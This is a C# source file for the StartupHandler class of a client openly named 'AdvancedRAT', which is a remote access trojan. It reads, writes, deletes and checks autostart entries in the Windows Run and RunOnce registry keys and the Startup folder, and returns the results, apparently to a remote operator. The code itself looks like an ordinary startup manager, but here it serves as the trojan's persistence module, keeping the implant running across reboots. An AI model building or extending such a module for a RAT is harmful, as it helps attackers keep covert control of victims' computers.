using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.IO;
using System.Linq;

namespace AdvancedRAT.Client.Handlers
{
    public class StartupHandler
    {
        private const string REGISTRY_RUN_KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        private const string REGISTRY_RUN_ONCE_KEY = @"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce";
        
        public async Task<object> GetStartupList()
        {
            try
            {
                var startupItems = new List<Dictionary<string, string>>();

                // Registry Run 키
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_KEY))
                {
                    if (key != null)
                    {
                        foreach (string valueName in key.GetValueNames())
                        {
                            string value = key.GetValue(valueName)?.ToString() ?? "";
                            startupItems.Add(new Dictionary<string, string>
                            {
                                ["Name"] = valueName,
                                ["Path"] = value,
                                ["Location"] = "HKCU\\Run",
                                ["Type"] = "Registry",
                                ["Enabled"] = "True"
                            });
                        }
                    }
                }

                // Registry RunOnce 키
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_ONCE_KEY))
                {
                    if (key != null)
                    {
                        foreach (string valueName in key.GetValueNames())
                        {
                            string value = key.GetValue(valueName)?.ToString() ?? "";
                            startupItems.Add(new Dictionary<string, string>
                            {
                                ["Name"] = valueName,
                                ["Path"] = value,
                                ["Location"] = "HKCU\\RunOnce",
                                ["Type"] = "Registry",
                                ["Enabled"] = "True"
                            });
                        }
                    }
                }

                // HKLM Run 키 (관리자 권한 필요)
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REGISTRY_RUN_KEY))
                    {
                        if (key != null)
                        {
                            foreach (string valueName in key.GetValueNames())
                            {
                                string value = key.GetValue(valueName)?.ToString() ?? "";
                                startupItems.Add(new Dictionary<string, string>
                                {
                                    ["Name"] = valueName,
                                    ["Path"] = value,
                                    ["Location"] = "HKLM\\Run",
                                    ["Type"] = "Registry",
                                    ["Enabled"] = "True"
                                });
                            }
                        }
                    }
                }
                catch { }

                // Startup 폴더
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (Directory.Exists(startupFolder))
                {
                    var files = Directory.GetFiles(startupFolder);
                    foreach (string file in files)
                    {
                        var fileInfo = new FileInfo(file);
                        startupItems.Add(new Dictionary<string, string>
                        {
                            ["Name"] = fileInfo.Name,
                            ["Path"] = file,
                            ["Location"] = "Startup Folder",
                            ["Type"] = "Shortcut",
                            ["Enabled"] = "True"
                        });
                    }
                }

                return new { success = true, startupItems, count = startupItems.Count };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> AddStartup(string name, string path, string location = "HKCU")
        {
            try
            {
                if (location == "HKCU")
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_KEY, true))
                    {
                        if (key != null)
                        {
                            key.SetValue(name, path);
                            return new { success = true, message = $"Startup item '{name}' added to HKCU\\Run" };
                        }
                    }
                }
                else if (location == "HKLM")
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REGISTRY_RUN_KEY, true))
                    {
                        if (key != null)
                        {
                            key.SetValue(name, path);
                            return new { success = true, message = $"Startup item '{name}' added to HKLM\\Run" };
                        }
                    }
                }
                else if (location == "Startup")
                {
                    string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string shortcutPath = Path.Combine(startupFolder, name + ".lnk");
                    
                    // 바로가기 생성 (간단한 복사)
                    if (File.Exists(path))
                    {
                        File.Copy(path, shortcutPath, true);
                        return new { success = true, message = $"Startup item '{name}' added to Startup folder" };
                    }
                }

                return new { success = false, message = "Invalid location or operation failed" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> RemoveStartup(string name, string location = "HKCU")
        {
            try
            {
                if (location == "HKCU\\Run" || location == "HKCU")
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_KEY, true))
                    {
                        if (key != null)
                        {
                            key.DeleteValue(name, false);
                            return new { success = true, message = $"Startup item '{name}' removed from HKCU\\Run" };
                        }
                    }
                }
                else if (location == "HKCU\\RunOnce")
                {
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_ONCE_KEY, true))
                    {
                        if (key != null)
                        {
                            key.DeleteValue(name, false);
                            return new { success = true, message = $"Startup item '{name}' removed from HKCU\\RunOnce" };
                        }
                    }
                }
                else if (location == "HKLM\\Run" || location == "HKLM")
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REGISTRY_RUN_KEY, true))
                    {
                        if (key != null)
                        {
                            key.DeleteValue(name, false);
                            return new { success = true, message = $"Startup item '{name}' removed from HKLM\\Run" };
                        }
                    }
                }
                else if (location == "Startup Folder" || location == "Startup")
                {
                    string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    string filePath = Path.Combine(startupFolder, name);
                    
                    if (File.Exists(filePath))
                    {
                        File.Delete(filePath);
                        return new { success = true, message = $"Startup item '{name}' removed from Startup folder" };
                    }
                }

                return new { success = false, message = "Startup item not found" };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> CheckStartupExists(string name)
        {
            try
            {
                var locations = new List<string>();

                // HKCU Run
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_KEY))
                {
                    if (key != null && key.GetValue(name) != null)
                    {
                        locations.Add("HKCU\\Run");
                    }
                }

                // HKCU RunOnce
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(REGISTRY_RUN_ONCE_KEY))
                {
                    if (key != null && key.GetValue(name) != null)
                    {
                        locations.Add("HKCU\\RunOnce");
                    }
                }

                // HKLM Run
                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(REGISTRY_RUN_KEY))
                    {
                        if (key != null && key.GetValue(name) != null)
                        {
                            locations.Add("HKLM\\Run");
                        }
                    }
                }
                catch { }

                // Startup Folder
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (Directory.Exists(startupFolder))
                {
                    var files = Directory.GetFiles(startupFolder, name + "*");
                    if (files.Length > 0)
                    {
                        locations.Add("Startup Folder");
                    }
                }

                return new 
                { 
                    success = true, 
                    exists = locations.Count > 0,
                    locations,
                    count = locations.Count
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }

        public async Task<object> GetStartupFolderPath()
        {
            try
            {
                string userStartup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string commonStartup = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);

                return new 
                { 
                    success = true,
                    userStartup,
                    commonStartup
                };
            }
            catch (Exception ex)
            {
                return new { success = false, message = ex.Message };
            }
        }
    }
}
